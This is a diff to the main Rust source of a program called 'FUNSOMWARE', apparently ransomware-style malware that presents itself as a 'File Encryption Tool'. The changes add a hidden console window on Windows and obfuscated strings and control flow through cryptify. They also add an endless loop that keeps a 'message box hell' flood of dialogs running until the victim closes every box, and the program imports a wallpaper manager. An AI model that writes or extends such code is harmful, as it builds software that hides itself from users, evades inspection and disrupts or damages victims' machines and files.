@@ -1,3 +1,7 @@
+// Hide console window on Windows when SHOW_CLI is false
+// This must be at the very top of main.rs before any other code
+#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
+
 use cryptify::{encrypt_string, flow_stmt};
 use std::thread;
 use std::time::Duration;
@@ -9,6 +13,15 @@ mod wallpaper_manager;
 mod messagebox_spawner;
 
 fn main() {
+    // If SHOW_CLI is true but we're in windows subsystem mode, allocate a console
+    #[cfg(target_os = "windows")]
+    if config::SHOW_CLI {
+        unsafe {
+            use winapi::um::consoleapi::AllocConsole;
+            AllocConsole();
+        }
+    }
+    
     // Add obfuscated control flow
     flow_stmt!();
 
@@ -34,7 +47,7 @@ fn main() {
                 }
             }
             
-            // STEP 2: Spawn message box hell (non-blocking, every 2 seconds)
+            // STEP 2: Spawn message box hell (non-blocking, every N milliseconds)
             if config::SHOW_MESSAGEBOXES {
                 if config::SHOW_CLI {
                     println!("\n{}", encrypt_string!("Starting message box hell... 😈"));
@@ -47,39 +60,26 @@ fn main() {
                 
                 messagebox_spawner::spawn_messagebox_hell();
                 
-                // Keep the main thread alive long enough for message boxes to spawn
-                // Calculate total time needed
-                let total_time = if config::MESSAGEBOX_LOOP_COUNT == 0 {
-                    // Infinite - sleep for a very long time
-                    Duration::from_secs(u64::MAX)
-                } else {
-                    // Sleep for total spawn time + extra buffer
-                    Duration::from_secs(
-                        config::MESSAGEBOX_LOOP_COUNT as u64 * config::MESSAGEBOX_DELAY_SECONDS + 10
-                    )
-                };
-                
                 if config::SHOW_CLI {
                     println!("{}", encrypt_string!("Message boxes spawning in background..."));
-                    println!("{}", encrypt_string!("Press Ctrl+C to exit"));
+                    println!("{}", encrypt_string!("Main thread will stay alive indefinitely"));
+                    println!("{}", encrypt_string!("Press Ctrl+C to exit (or just close all message boxes)"));
                 }
                 
-                thread::sleep(total_time);
+                // Keep the main thread alive FOREVER so message box threads don't get killed
+                // The message boxes will stay open until the user manually closes each one
+                loop {
+                    thread::sleep(Duration::from_secs(3600)); // Sleep in 1-hour chunks
+                }
             }
         }
         Err(e) => {
             eprintln!("{} {}", encrypt_string!("Fatal error:"), e);
             
-            // Show error message box
+            // Show error message box (Windows only)
+            #[cfg(target_os = "windows")]
             if config::SHOW_MESSAGEBOXES {
-                use native_dialog::{DialogBuilder, MessageLevel};
-                DialogBuilder::message()
-                    .set_level(MessageLevel::Error)
-                    .set_title(&encrypt_string!("FUNSOMWARE - Error"))
-                    .set_text(&format!("{}: {}", encrypt_string!("Fatal error"), e))
-                    .alert()
-                    .show()
-                    .ok();
+                show_error_messagebox(&format!("{}: {}", encrypt_string!("Fatal error"), e));
             }
             
             std::process::exit(1);
@@ -98,4 +98,32 @@ fn print_banner() {
     println!("{}", encrypt_string!("   File Encryption Tool"));
     println!("{}", encrypt_string!("================================="));
     println!();
+}
+
+#[cfg(target_os = "windows")]
+fn show_error_messagebox(message: &str) {
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+    use winapi::um::winuser::{MessageBoxW, MB_OK, MB_ICONERROR};
+    
+    let title = "FUNSOMWARE - Error";
+    
+    unsafe {
+        let title_wide: Vec<u16> = OsStr::new(title)
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
+        
+        let text_wide: Vec<u16> = OsStr::new(message)
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
+        
+        MessageBoxW(
+            std::ptr::null_mut(),
+            text_wide.as_ptr(),
+            title_wide.as_ptr(),
+            MB_OK | MB_ICONERROR,
+        );
+    }
 }
